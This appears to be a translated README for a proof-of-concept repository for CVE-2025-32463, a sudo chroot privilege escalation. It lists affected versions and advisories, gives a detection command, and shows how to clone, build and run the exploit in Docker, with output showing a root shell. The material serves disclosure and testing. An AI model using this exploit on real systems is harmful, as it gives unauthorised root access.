<translate-content># CVE-2025-32463 – sudo chroot（“chwoot”）PoC

本仓库提供了一个最小且可复现的环境，用于演示 `sudo` chroot 功能中的 **CVE‑2025‑32463** 权限提升漏洞。
- 该漏洞由 [Rich Mirch](https://www.stratascale.com/team/rich-mirch)（X 上的 [@0xm1rch](https://x.com/0xm1rch)）@ [Stratascale](https://www.stratascale.com/) 报告。
- 原始发布：[漏洞通告：Sudo chroot 权限提升](https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot)
- NVD：[CVE-2025-32463](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)（CVSS 9.3）

---

## 受影响版本

> 大多数 Linux 发行版中，**sudo 1.9.14** 到 **1.9.17**（所有 p 版本）存在漏洞。

安全页面
- [Ubuntu](https://ubuntu.com/security/CVE-2025-32463)（CVSS 9.3）
- [Redhat](https://access.redhat.com/security/cve/cve-2025-32463)（CVSS 7.8）
- [SUSE](https://www.suse.com/security/cve/CVE-2025-32463.html)（CVSS 7.8）
- [Debian](https://security-tracker.debian.org/tracker/CVE-2025-32463)

---

## 内容

| 文件               | 目的                                                                               |
| ------------------ | ---------------------------------------------------------------------------------- |
| **Dockerfile**     | 构建带有漏洞的 **sudo 1.9.16p2** 及构建工具的 Ubuntu 24.04 镜像                   |
| **sudo‑chwoot.sh** | 演示概念利用，生成在 chroot 内的 root shell                                        |
| **run.sh**         | 辅助脚本，用于构建镜像（如有需要）并启动利用容器                                  |

---

## 快速漏洞检测</translate-content>
```bash
# Vulnerable sudo
pwn ~ $ sudo -R woot woot
sudo: woot: No such file or directory

# Patched sudo
pwn ~ $ sudo -R woot woot
[sudo] password for pwn:
sudo: you are not permitted to use the -R option with woot
```
## 在Docker容器中测试漏洞利用


```bash
# 1 – clone repo
$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
$ cd CVE-2025-32463_chwoot

# 2 – build and run Docker image (tagged "sudo-chwoot")
$ ./run.sh

# 3 – run exploit in container (runs root command directly or drops you into a root shell)
pwn@f722d9182d1f:~$ ./sudo-chwoot.sh id
woot!
uid=0(root) gid=0(root) groups=0(root),1001(pwn)
pwn@f722d9182d1f:~$ ./sudo-chwoot.sh
woot!
root@f722d9182d1f:/# id
uid=0(root) gid=0(root) groups=0(root),1001(pwn)
root@f722d9182d1f:/#
```
`run.sh` 传递 `--privileged` 和 `--rm` 给 Docker，因此当你退出时，容器会自动清理自己。

---

## 清理

完成后删除镜像：


```bash
docker rmi sudo-chwoot
```
---

## 参考资料

- Stratascale CRU 漏洞说明：[漏洞通告：Sudo chroot 提权漏洞](https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot)



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-16

---